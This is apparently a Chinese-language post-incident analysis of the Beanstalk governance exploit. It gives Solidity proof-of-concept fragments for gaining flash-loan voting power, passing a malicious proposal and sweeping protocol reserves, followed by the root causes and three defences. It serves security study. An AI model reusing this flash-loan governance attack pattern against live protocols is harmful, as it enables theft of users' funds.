# Beanstalk $182M — 代码级分析

## 漏洞合约: `beanstalkgovernance.sol`  

### 攻击核心: `propose()` 无投票快照

```solidity
function propose(
    IDiamondCut.FacetCut[] calldata _diamondCut,
    address _init,
    bytes calldata _calldata,
    uint8 _pauseOrUnpause
) external {
    // ⚠️ 只检查msg.sender代币余额 — 实时查询!
    // 没有快照, 没有锁定期, 没有最小质押时间
    require(getStalkBalance(msg.sender) >= proposalThreshold);
}
```

### 攻击执行

**Step 1: 获取投票权**
```solidity
// 先用75 ETH买BEAN
uniswapv2.swapExactETHForTokens{value: 75 ether}(0, path, ...);
// → 获得大量BEAN → 存入Silo获得Stalk (投票权)
siloV2Facet.depositBeans(bean.balanceOf(address(this)));

// 闪贷补足剩余的投票权
// (PoC中用初始代币, 真实攻击用闪贷借$1B BEAN)
```

**Step 2: 通过恶意提案**
```solidity
// BIP-18 恶意提案:
beanstalkgov.propose(
    _diamondCut,      // 空的facet变更 (无伤表面)
    address(this),    // 恶意合约地址 ← 关键!
    sweepCalldata,    // 调用sweep()函数
    3                 // pauseOrUnpause标志
);

// 1天后 → 提案通过
cheat.warp(block.timestamp + 24 * 60 * 60);

// 然后从Aave闪贷$1B:
aavelendingPool.flashLoan(address(this), [dai,usdc,usdt], amounts, 0, "");
```

**Step 3: 执行提案 → 抽空协议**
```solidity
function sweep() external {
    // BeauStalk提案执行 → 将协议储备转给攻击者
    // 真实攻击转了 ~$76M USDC/USDT/DAI + ~$105M BEAN
}
```

## 为什么能成功

1. **实时投票权重**: `getStalkBalance()`不使用快照 — 闪贷后可立即投票
2. **Emergency提案无时间锁**: `_pauseOrUnpause=3` → 绕过正常7天等待
3. **利润>成本**: 
   - 总成本: ~$2M (75 ETH + 闪贷利息)
   - 攻击所得: ~$76M 稳定币 (~$105M BEAN)
   - 归还闪贷后: ~$72M纯利润

**模式**: #8 (闪贷治理) — 教科书级案例
**合约级**: Diamond pattern下的governance facet — 提案无需时间锁定
**防御**: 
1. 使用快照投票 (治理快照作为投票权重)
2. 关键提案必须有7天时间锁 (即使emergency)
3. 限制单提案可转移的最大金额
